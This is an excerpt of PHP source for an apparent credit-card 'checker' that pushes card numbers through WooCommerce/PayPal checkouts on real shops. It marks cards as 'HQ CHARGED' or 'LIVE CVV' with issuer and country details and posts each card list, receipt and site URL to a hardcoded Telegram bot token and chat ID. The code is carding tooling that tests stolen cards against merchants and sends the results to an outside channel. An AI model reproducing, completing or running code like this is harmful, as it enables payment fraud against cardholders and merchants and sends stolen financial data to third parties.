...
$chatId1 = $parts[2];
$telegramToken = "7723561160:AAHZp0guO69EmC_BumauDsDeseTvh7GY3qA"; // Replace with your bot token
$chatId = "7405188060"; // Replace with your chat ID

if ($ATC) {
    $checkoutPattern = '/ ['.$ip.'] <a href="([^"]+)" class="button (checkout|btn-checkout) wc-forward">Checkout<\/a>| ['.$ip.'] <a href="([^"]+)">Checkout<\/a>|<form[^>]+action="([^"]+)"[^>]*>/';
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
         ...
         echo '<span style="color: #ffffffff; padding: 8px;"> #CVV [HQ CHARGED][AMOUNT:'.$price1.'] ['.$ip.'] </a> <a href="' . $receiptUrl . '" target="_blank">RECEIPT</a> <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

    // Prepare Telegram message for HQ (Live)
    $telegramMessage = "[#HQ] - $lista [PPCP-GATEWAY HQ CHARGED] 
            \n[$receiptUrl]
            \n[$price1]
            \n[$hostname1]\n";
...
$log_entry .= "*Email* : `" . $escaped_email . "`\n";
   ...
   <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
    ...
    echo '<span style="color: #ffffffff; padding: 8px;"> #CVV [#PAYMENT_DENIED LIVE CVV][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    ...
    $telegramMessage = "[#LIVE] - $lista [PPCP-GATEWAY CVV LIVE] 
            \n[$price1]
            \n[$hostname1]\n";
